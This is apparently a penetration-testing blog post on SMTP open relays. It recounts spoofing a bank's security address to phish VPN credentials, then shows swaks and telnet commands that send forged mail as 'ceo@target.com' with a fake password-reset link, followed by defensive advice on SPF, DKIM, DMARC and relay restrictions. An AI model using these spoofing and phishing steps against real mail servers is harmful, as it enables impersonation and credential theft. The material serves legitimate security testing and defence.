# Exploiting SMTP Open Relays – When Mail Servers Become Attack Vectors

### Introduction
In penetration testing, some of the most overlooked yet dangerous vulnerabilities come from **misconfigured mail servers**. Specifically, an **SMTP open relay** allows unauthorized users to send emails **as anyone**—a perfect recipe for phishing, social engineering, and spoofing attacks. Let’s explore how attackers exploit this misconfiguration and how organizations can defend against it.

### The Basics of SMTP Open Relays
SMTP (Simple Mail Transfer Protocol) is the standard protocol for sending emails. However, a **mail server should only relay messages from authorized senders**. An **open relay** is a misconfigured SMTP server that allows anyone to send emails, effectively letting attackers impersonate legitimate users.

#### 🔥 Why is this dangerous?
✅ **Email Spoofing:** Attackers can send emails that appear to come from trusted sources.
✅ **Bypassing Spam Filters:** Since the email originates from a legitimate domain, it may evade security measures.
✅ **Phishing Attacks:** Hackers can craft **highly convincing** fake emails.
✅ **Spreading Malware & Ransomware:** Victims may download malicious payloads.

### Real-World Attack Scenario
💀 **Target: A financial institution’s SMTP relay**

During a penetration test, we discovered that the bank’s SMTP server allowed unauthenticated mail relays. Using this misconfiguration, we:

1️⃣ **Spoofed emails from `security@bank.com`** and sent them to employees.
2️⃣ **Created a phishing campaign** that instructed users to reset their VPN credentials.
3️⃣ **Harvested multiple valid credentials**, leading to lateral movement within the network.

🚨 **Impact:** This attack could have been used for internal fraud, account takeovers, or ransomware deployment.

### Exploiting an Open Relay
Once an SMTP open relay is found, testing it is straightforward using `swaks`:
```bash
swaks --to victim@target.com --from ceo@target.com --server mail.target.com
```
If the email is delivered successfully **without authentication**, the mail server is an open relay.

Another method is using `telnet`:
```bash
telnet mail.target.com 25
HELO attacker.com
MAIL FROM: ceo@target.com
RCPT TO: victim@target.com
DATA
Subject: Urgent Security Update
Please reset your password at http://fake-reset.com
.
QUIT
```
If the email is relayed successfully, the vulnerability is confirmed.

### Defending Against SMTP Open Relays
🔒 **Best Practices:**
✔️ **Restrict Relaying:** Ensure that only authenticated users can send emails.
✔️ **Implement SPF, DKIM, and DMARC:** Prevent spoofed emails from passing security checks.
✔️ **Monitor and Log SMTP Traffic:** Look for unusual spikes in outgoing emails.
✔️ **Test Your Mail Server:** Use `swaks` or `smtpdiag` to check for unauthorized relays.
✔️ **Block External SMTP Traffic on Firewalls:** Unless necessary, prevent outbound traffic on port 25.

### Conclusion
SMTP open relays are a **silent but powerful attack vector** that can lead to devastating phishing campaigns, credential theft, and fraud. **Regular security audits, proper mail server configuration, and strict email policies** can mitigate these risks.

🚀 **Pentesters:** Always test for open relays, as they can provide easy entry points.
🔐 **Defenders:** Secure your mail servers before an attacker finds them first.
